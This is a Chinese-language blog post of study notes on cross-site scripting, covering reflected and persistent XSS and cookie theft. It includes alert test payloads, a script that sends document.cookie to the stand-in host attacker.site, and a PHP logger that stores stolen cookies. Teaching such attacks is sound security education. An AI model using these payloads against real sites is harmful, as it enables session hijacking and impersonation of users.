---
layout: post
title: "Cross Site Scripting"
date: "2022-06-29"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student
    - Web Attacks
---

# Cross Site Scripting（跨站脚本）
这如何支持我的渗透测试生涯？
* 攻击 Web 应用程序用户的能力
* 能够控制 Web 应用程序的内容
* 获得高级网络攻击技能

跨站点脚本 (XSS) 是一个漏洞，可让攻击者控制 Web 应用程序的某些内容。
通过利用跨站点脚本，攻击者可以针对 Web 应用程序用户。

通过使用 XSS，攻击者可以：
* 在运行时修改站点的内容；
* 注入恶意内容；
* 窃取用户的 cookie，即会话；
* 像合法用户一样在 Web 应用程序上执行操作；
* 以及更多！

## XSS Actors（XSS 参与者）
参与 XSS 攻击的参与者有：
* 易受攻击的网站
* 受害用户（网站访问者）
* 渗透测试员

### Vulnerable Web Applications（易受攻击的 Web 应用程序）
**易受攻击的 Web 应用程序**使 XSS 攻击成为可能。
当 Web 应用程序使用**未经过滤的用户输入**来**构建**显示给最终用户的**输出内容**时，就会发生 XSS 漏洞；这让攻击者可以控制输出的 HTML 和 JavaScript 代码，从而攻击应用程序用户。

在这种攻击中，用户输入是来自 Web 应用程序客户端的任何参数，例如：
* 请求标头
* Cookies
* 表单输入
* POST 参数
* GET参数

所有这些输入都应该通过实施良好的安全函数在**服务器端**进行验证，这些安全函数应该清理或过滤用户的输入。
防止跨站点脚本漏洞的唯一方法是**永远不要相信用户输入！**

### Users
大多数时候，XSS 攻击的受害者是网站的用户或访问者。请记住，其中一位用户可能是网站本身的管理员！
XSS 涉及将恶意代码注入到网页的输出中。然后，访问用户的浏览器会呈现（或执行）此恶意代码。

开发人员通常认为修复跨站点脚本漏洞的优先级较低，因为：当安全研究人员演示跨站点脚本攻击时，他们会使用消息窗口等无害函数。

但是，正如我们将看到的，恶意用户可以通过 XSS 攻击做更多事情！
此外，如果 Web 应用程序容易受到 XSS 攻击，受害者可能很难意识到攻击正在进行；大多数情况下，攻击是非常微妙的，不会对易受攻击的站点进行任何可见的更改。

### Attackers
恶意用户利用 XSS 漏洞通过以下方式攻击网站用户：
* 让他们的浏览器加载恶意内容
* 代表他们执行操作，例如购买产品或更改密码
* 窃取他们的会话 cookie，从而能够在易受攻击的站点上冒充他们

冒充用户可能会导致整个网站被接管。如果攻击者窃取了经过身份验证的网站管理员的 cookie 怎么办？
在下面的幻灯片中，您将看到如何测试 XSS 以及如何使用它来执行 cookie 窃取。

## Finding an XSS（寻找 XSS）
EXAMPLE

要找到 XSS，您必须查看每个用户输入，并测试它是否以某种方式显示在 Web 应用程序的输出中。

在此示例中，搜索参数通过表单提交并显示在输出（反射点）上。

请注意，搜索到的字符串通过 GET 参数传递给 Web 应用程序。

![hack-me-xss.jpg](/img/in-post/ine/inehack-me-xss.jpg)

找到反射点后，你必须了解是否可以注入 HTML 代码，看看它是否以某种方式到达页面的输出； 这使您可以控制输出页面！
您可以使用任何有效的 HTML 标记并尝试了解它是否到达页面。 查看输出页面的 HTML 源代码有助于了解如何构建 XSS 有效负载。

EXAMPLE

有时只需注入一个无害的标签，如 `<i>`、`<pre>` 或 `<plaintext>`。

`<i>test string`

![hack-me-i.jpg](/img/in-post/ine/hack-me-i.jpg)

在此示例中，`<i>` 标记被注入，并且测试字符串在输出中以斜体显示，因此 HTML 已被解释。

![hack-me-italics.jpg](/img/in-post/ine/hack-me-italics.jpg)

要测试 XSS，您可以注入一些有效的 HTML/JavaScript 代码，例如 `<script>alert('XSS')</script>`

![hack-me-alert.jpg](/img/in-post/ine/hack-me-alert.jpg)

要利用您发现的 XSS 漏洞，您需要知道您正在执行的跨站点脚本攻击的**类型**。 跨站点脚本漏洞可以是**反射的、持久的或基于 DOM 的**。
在本课程中，我们将看到反射型和持久型 XSS。

## Reflected XSS Attacks（反射型 XSS 攻击）
当受害者的浏览器向易受攻击的网站发送**的请求中**携带恶意负载时，就会发生**反射攻击**。
它们可以通过在社交网络上发布链接或通过网络钓鱼活动来触发。 当用户点击链接时，他们会触发攻击。

我们在前面的例子中看到的搜索表单 XSS 就是一个**反射的跨站脚本漏洞**。 在该示例中，我们可以制作一个指向搜索页面的链接并将有效负载嵌入到 find GET 参数中。

```url
http://victim.site/search.php?find=<payload>
```

这种类型的攻击称为反射，因为浏览器发送的 HTTP 请求的输入字段会立即反映到输出页面。

### Reflected XSS Filters（反射型 XSS 过滤器）
一些浏览器，比如谷歌浏览器，内置了**反射 XSS 过滤器**。这意味着它们不会运行**一些** XSS 反射攻击。

![reflected-xss-filters.jpg](/img/in-post/ine/reflected-xss-filters.jpg)

现实情况是，他们只能过滤琐碎和已知的 XSS 攻击。 有一些高级攻击可以绕过 Anti-XSS 过滤器。
这些超出了本基础课程的范围。 而且，这些过滤器无法阻止**持久性 XSS 攻击！**

## Persistent XSS Attacks（持续的 XSS 攻击）
当有效负载被发送到易受攻击的 Web 服务器然后存储时，就会发生**持久性 XSS 攻击**。 当易受攻击网站的网页拉取存储的恶意代码并将其放入 HTML 输出中时，它将传递 XSS 有效负载。
它被称为持久性，因为每次网络浏览器点击“注入”网页时都会传递恶意代码。

这是一种非常危险的 XSS 形式，因为通过一次攻击，黑客可以利用多个 Web 应用程序用户。
如果攻击者设法在社交网络页面上编写恶意负载（HTML 或 JavaScript），则访问该页面的每个用户都将运行负载！

持续性攻击最常见的载体是 HTML 表单，它们向 Web 服务器提交内容，然后将该内容显示给用户。
评论、用户资料和论坛帖子等元素是 XSS 攻击的潜在载体。

如果攻击者设法在论坛帖子中注入恶意脚本，则每个打开该帖子的人都会运行该脚本； 例如，这可以让攻击者悄悄地窃取访问者的 cookie 并冒充他们，甚至不知道他们的登录凭据！

## Cookie Stealing via XSS（通过 XSS 窃取 Cookie）
在下面的幻灯片中，您将学习如何通过 XSS 攻击窃取 cookie。
正如您从 Web 应用程序模块中知道的那样，如果 JavaScript 没有启用 HttpOnly 标志，则它们可以访问 cookie； 这意味着可以使用 XSS 攻击来窃取 cookie。 在许多情况下，窃取 cookie 意味着窃取用户会话！

例如，您可以使用 `<script>alert(document.cookie)</script>` 显示当前的 cookie。

![alert-cookie.png](/img/in-post/ine/alert-cookie.png)

使用以下代码，您可以将 cookie 内容发送到攻击者控制的站点。

```javascript
<script>
var i = new Image();
i.src = "http://attacker.site/log.php?q="document.cookie;
</script>
```

该脚本生成一个图像对象并将其 src 指向攻击者服务器 (attacker.site) 上的脚本。

```
"http://attacker.site/log.php?q="+document.cookie
```

浏览器无法提前判断来源是否为真实图像，因此即使不显示任何图像，它也会加载并执行脚本！ 所以cookie实际上被发送到了attacker.site。

log.php 脚本将 cookie 保存在 attacker.site 上的文本文件中：

```php
<?php
$filename="/tmp/log.txt";
$fp=fopen($filename, 'a');
$cookie=$_GET['q'];
fwrite($fp, $cookie);
fclose($fp);
?>
```

## Hack.me
如果您想尝试更多的 XSS 和 Web 应用程序攻击，您可以免费注册 [Hack.me](https://hack.me/)，这是一个由 eLearnSecurity 构建的平台，可以即时运行易受攻击的 Web 应用程序！
我们在之前的幻灯片中向您展示的示例托管在 Hack.me 上！

## Resources（资源）
在我们结束本章关于跨站点脚本漏洞和攻击之前，如果您想加深知识，这里有一些有用的参考资料：

[Web Application Hacker's Handbook](https://www.amazon.com/The-Web-Application-Hackers-Handbook/dp/1118026470) 是关于 Web 应用程序安全性的最全面的书籍之一。

[OWASP - XSS](https://owasp.org/www-community/attacks/xss/) 开放 Web 应用程序安全项目的跨站点脚本章节。

## References
[Hack.me](https://hack.me/)